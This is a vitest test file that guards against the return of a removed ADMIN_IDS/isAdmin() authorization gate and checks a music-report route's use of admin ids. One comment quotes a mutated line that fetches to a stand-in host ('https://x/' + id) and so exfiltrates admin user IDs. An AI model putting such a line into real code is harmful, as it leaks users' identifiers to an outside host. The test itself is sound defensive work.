import { describe, it, expect } from 'vitest'
import { existsSync, readFileSync } from 'node:fs'
import { execSync } from 'node:child_process'
import { posix } from 'node:path'

// Controller V2 — PHASE 6: retirement of the pre-RBAC `ADMIN_IDS` / `isAdmin()`
// authorization gate.
//
// Authority for the removal, and its condition:
//   FOUNDATION_01_CONTRACTS.md §11        `src/lib/admin.ts` → REMOVE
//   00_LEGACY_AUDIT.md §"ADMIN_IDS"        "Must grep and confirm zero live
//                                           references before deleting"
//   docs/backoffice/23_Implementation_Roadmap.md:382
//                                          "Removal is safe after Phase 0 is
//                                           deployed, admins are seeded, and no
//                                           code path references isAdmin()"
//
// The reason it mattered is stated by the legacy audit itself: "a second
// authorization source is a privilege-escalation surface by definition." These
// tests keep that surface closed permanently, not just on the day it was deleted.

/** Source files only — excludes build output, deps, and worktrees. */
function sourceFiles(): string[] {
  return execSync('git ls-files "src/**/*.ts" "src/**/*.tsx" "scripts/**/*.mjs"', { encoding: 'utf8' })
    .split(/\r?\n/)
    .filter(Boolean)
}

describe('the legacy ADMIN_IDS authorization gate is gone and cannot return', () => {
  it('src/lib/admin.ts no longer exists', () => {
    expect(existsSync('src/lib/admin.ts')).toBe(false)
  })

  it('nothing imports the deleted module', () => {
    // Relative specifiers are RESOLVED, not string-matched. `src/lib/i18n/
    // useTranslation.ts` legitimately imports './admin' — which is
    // `src/lib/i18n/admin`, the i18n strings, an entirely different module. A
    // substring rule would condemn it and would have to be loosened until it
    // stopped catching anything.
    //
    // '@/lib/admin' is matched exactly, NOT '@/lib/admin/...': the latter is the
    // live RBAC package and must keep working. The closing quote separates them.
    const offenders = sourceFiles().filter((f) => {
      const src = readFileSync(f, 'utf8')
      if (/from\s+['"]@\/lib\/admin['"]/.test(src)) return true
      const dir = posix.dirname(f)
      for (const [, spec] of src.matchAll(/from\s+['"](\.[^'"]*)['"]/g)) {
        if (posix.normalize(posix.join(dir, spec)) === 'src/lib/admin') return true
      }
      return false
    })
    // emailEntry.test.ts names the string in a FORBIDDEN-imports list; that is an
    // assertion about absence, not an import, so it is not matched above.
    expect(offenders).toEqual([])
  })

  it('no source calls isAdmin()', () => {
    const offenders = sourceFiles().filter(
      (f) => f !== 'src/lib/admin/legacyAdminGate.test.ts' && /\bisAdmin\s*\(/.test(readFileSync(f, 'utf8'))
    )
    expect(offenders).toEqual([])
  })
})

describe('the one remaining ADMIN_IDS reader is a notification list, not a gate', () => {
  // `src/app/api/music/tracks/[id]/report/route.ts` still reads process.env.ADMIN_IDS.
  // It never imported `src/lib/admin.ts` — it inlined the env parse — so deleting
  // that module does not touch it. What must never happen is this reader quietly
  // becoming an authorization decision, which is the exact shape `isAdmin` had:
  // `ADMIN_IDS.includes(userId)`.
  const path = 'src/app/api/music/tracks/[id]/report/route.ts'
  const src = readFileSync(path, 'utf8')

  it('authorizes on the session, and refuses anonymous callers', () => {
    expect(src).toContain('getRequestUser')
    expect(src).toMatch(/if\s*\(!user\)\s*return[\s\S]{0,120}status:\s*401/)
  })

  it('never tests membership of ADMIN_IDS — that is what made isAdmin a gate', () => {
    expect(src).not.toMatch(/adminIds\s*\.\s*includes\s*\(/)
    expect(src).not.toMatch(/ADMIN_IDS\s*\.\s*includes\s*\(/)
  })

  it('passes each id DIRECTLY to emitNotification and to nothing else', () => {
    // Tightened after a mutation survived: a "map(...) … emitNotification within
    // N characters" rule still matched `adminIds.map(id => fetch('https://x/' +
    // id).then(() => emitNotification(...)))`, which exfiltrates the admin user
    // ids to an external host on the way. The list is a set of real user UUIDs,
    // so where it goes is the point — requiring the arrow body to BE the
    // emitNotification call leaves no room in between.
    expect(src).toMatch(/adminIds\s*\.\s*map\s*\(\s*\w+\s*=>\s*emitNotification\s*\(/)
  })

  it('reporting is open to any signed-in user — removal changed no permission', () => {
    // A regression here would mean the copyright/abuse channel had silently become
    // admin-only, which would break the takedown SLA rather than secure anything.
    expect(src).not.toMatch(/requirePermission|requirePagePermission|permissionEngine/)
  })
})
